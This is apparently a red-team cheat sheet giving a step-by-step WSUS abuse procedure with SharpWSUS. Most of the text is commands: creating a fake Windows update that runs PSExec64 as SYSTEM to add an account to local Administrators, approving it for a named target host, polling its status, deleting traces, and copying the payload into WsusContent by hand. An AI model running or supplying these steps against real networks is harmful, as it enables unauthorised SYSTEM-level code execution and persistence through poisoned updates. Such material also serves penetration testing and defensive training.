# 05.13 WSUS SharpWSUS Abuse

> Push a malicious PSExec-backed Windows Update via `SharpWSUS` when WSUS runs over HTTP and you hold WSUS Administrator rights.

## Overview

WSUS (HTTP port 8530 by default) distributes Windows updates; if not over HTTPS an attacker with WSUS Administrator rights can inject a malicious PSExec-based update. SharpWSUS automates the full workflow: locate server, inspect managed computers, create a fake update, approve it for a target group, check status, and delete cleanup. If automatic file delivery fails, Event ID 364 reveals the expected path for a manually copied payload.

## Steps

- Verify WSUS server via registry: `reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer`.
- `SharpWSUS.exe locate` — finds WSUS server address.
- `SharpWSUS.exe inspect` — lists managed computers, groups, downstream servers.
- `SharpWSUS.exe create /payload /args /title` — crafts fake update using PSExec64.exe (signed MS binary) to run arbitrary cmd as SYSTEM.
- `SharpWSUS.exe approve /updateid /computername /groupname` — approves update; creates group if needed.
- `SharpWSUS.exe check /updateid /computername` — polls update installation status on target.
- If download fails (HTTP 404), use `Get-WinEvent` to find Event ID 364 and copy PSExec64.exe to the expected path in WsusContent.
- `SharpWSUS.exe delete /updateid /computername` — cleans up update and removes computer from group.

## Commands

### reg query WSUS server

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

### SharpWSUS locate

```powershell
.\SharpWSUS.exe locate
```

### SharpWSUS inspect

```powershell
.\SharpWSUS.exe inspect
```

### SharpWSUS create

```powershell
.\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate"
```

### SharpWSUS approve

```powershell
.\SharpWSUS.exe approve /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv01.<DOMAIN>.local /groupname:"FastUpdates"
```

### SharpWSUS check

```powershell
.\SharpWSUS.exe check /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv01.<DOMAIN>.local
```

### SharpWSUS delete

```powershell
.\SharpWSUS.exe delete /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv02.<DOMAIN>.local
```

### Get-WinEvent for download failure (Event 364)

```powershell
Get-WinEvent -LogName Application | Where-Object { $_.Id -eq 364 } |fl
```

### Copy PSExec64 to WsusContent

```powershell
copy C:\Tools\sysinternals\PSExec64.exe C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe
```
